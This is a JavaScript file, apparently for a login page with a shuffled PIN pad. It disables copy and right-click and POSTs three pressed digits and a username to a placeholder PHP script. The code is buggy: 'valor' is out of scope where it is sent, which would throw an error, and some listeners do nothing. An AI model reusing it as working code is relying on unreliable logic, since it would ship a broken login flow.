document.addEventListener('contextmenu', function (e) {
    e.preventDefault();
    e.stopPropagation();
});
document.addEventListener('copy', function (e) {
    e.preventDefault();
    e.stopPropagation();
});
document.addEventListener('cut', function (e) {
    e.preventDefault();
    e.stopPropagation();
});

function toogle() {
    var blur = document.getElementById('blur');
    blur.classList.toggle('active');
}

function cambiarSiguienteBotonVerde() {
    // Obtén el siguiente botón con la clase fa-regular fa-circle
    const regularButton = document.querySelector('.fa-regular.fa-circle');

    // Si hay un botón, cámbiale la clase y el color
    if (regularButton) {
        regularButton.className = 'fa-solid fa-circle-xmark';
        regularButton.style.color = 'green';
    }
}

const pulsados = [];

function numerosRandom() {
    console.log("numerosRandom function called");
    const buttonContainer = document.getElementById("button-container");
    const buttons = Array.from(buttonContainer.children);

    buttons.forEach((button) => {
        button.addEventListener("click", function () {
            const value = button.id;
            console.log(value);

            if (pulsados.length < 3) {
                pulsados.push(value);
                console.log("Números pulsados:", pulsados);
                
                cambiarSiguienteBotonVerde();
            } else {
                console.log("Ya se han pulsado 3 números. Limite alcanzado.");
            }

            // Llama a la función para enviar la solicitud al servidor después de haber recopilado los valores
            if (pulsados.length === 3) {
                enviarSolicitudAlServidor(pulsados);
            }
        });
    });
}

function enviarSolicitudAlServidor(pulsados) {
    let inputUsuario = document.getElementById("usuarioInput");

    // Agrega un evento de cambio al input
    inputUsuario.addEventListener("input", function() {
        // Recoge el valor del input
        let valor = inputUsuario.value;
    });
    // Datos que deseas enviar al servidor
    var datos = {
        pulsados: pulsados,
        valor
    };

    // Configuración de la solicitud HTTP
    var configuracion = {
        method: "POST", // Método de la solicitud
        headers: {
            "Content-Type": "application/json", // Tipo de contenido que estás enviando
        },
        body: JSON.stringify(datos), // Convierte los datos a formato JSON
    };

    // Realiza la solicitud HTTP al script PHP en el servidor
    fetch("tuscript.php", configuracion)
        .then((response) => response.json())
        .then((data) => {
            console.log("Respuesta del servidor:", data);
        })
        .catch((error) => {
            console.error("Error al enviar la solicitud:", error);
        });
}

function pinRandom() {
    console.log("pinRandom function called");
    const buttonContainer = document.getElementById("pin-btn");
    const buttons = Array.from(buttonContainer.children);

    buttons.forEach((button) => {
        button.addEventListener("click", function () {
            const value = button.textContent.trim();
        });
    });

    for (let i = buttons.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [buttons[i], buttons[j]] = [buttons[j], buttons[i]];
    }

    buttonContainer.innerHTML = '';

    buttons.forEach((button) => {
        buttonContainer.appendChild(button);
    });
}

window.addEventListener("load", numerosRandom);
window.addEventListener("load", pinRandom);



